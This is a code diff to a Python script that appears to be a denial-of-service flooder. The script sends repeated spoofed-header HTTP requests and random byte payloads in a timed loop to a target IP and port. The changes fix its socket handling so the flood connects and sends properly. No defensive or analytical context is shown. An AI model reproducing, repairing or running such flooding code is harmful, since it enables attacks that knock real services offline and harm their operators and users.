@@ -50,18 +50,20 @@ def start():
     acceptall = "AcceptAll: "+random.choice(acceptall)+random.choice(ref)
     bypass_user = UserAgent + reffer + acceptall + "\r\n"
     timeout = time.time() + float(times)
-    sock = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP)
+    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     while True:
           try:
+              sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
               time.time() + float(times)
               pack = random._urandom(1000)
               packw = random._urandom(1444)
               msg = Attack[random.randrange(0,3)]
-              s.connect((str(ip),int(port)))
-              s.send(str.encode(bypass_user))
-              s.send(str.encode(bypass_user))
-              s.send(str.encode(bypass_user))
+              sock.connect((str(ip),int(port)))
+              sock.send(str.encode(bypass_user))
+              sock.send(str.encode(bypass_user))
+              sock.send(str.encode(bypass_user))
               for _ in range(th):
+                  sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                   s.connect((str(ip),int(port)))
                   s.send(str.encode(bypass_user))
           except:
